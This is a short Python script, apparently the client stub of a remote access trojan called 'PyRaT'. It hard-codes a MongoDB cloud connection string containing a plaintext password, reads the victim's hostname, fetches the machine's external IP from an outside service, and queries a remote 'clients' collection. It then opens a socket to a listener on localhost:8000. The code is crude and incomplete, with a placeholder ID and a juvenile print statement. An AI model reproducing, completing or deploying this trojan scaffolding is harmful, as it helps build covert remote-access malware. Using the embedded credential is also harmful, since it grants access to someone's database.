from pymongo import MongoClient
import os
import socket
import requests



ip = "localhost"
port = 8000
password = "SB5aaHgp2IYtT72e"
connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"


temp_id = "TEMP_ID"
pcname = socket.gethostname()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client = MongoClient(connection_string)

url = 'http://myexternalip.com/raw'
r = requests.get(url)
client_ip = r.text

mydb = client["PyRaT"]
mycol = mydb["clients"]

query = {"_id" : f"{temp_id}" }

info = mycol.find(query)

for x in info:
    info_list = x

if info_list["first_connection?"] == True:
    print("sex")

else:
    pass





def main():
    print("connected")


try: 
    s.connect((ip, port))
    main()
except Exception: exit(1)






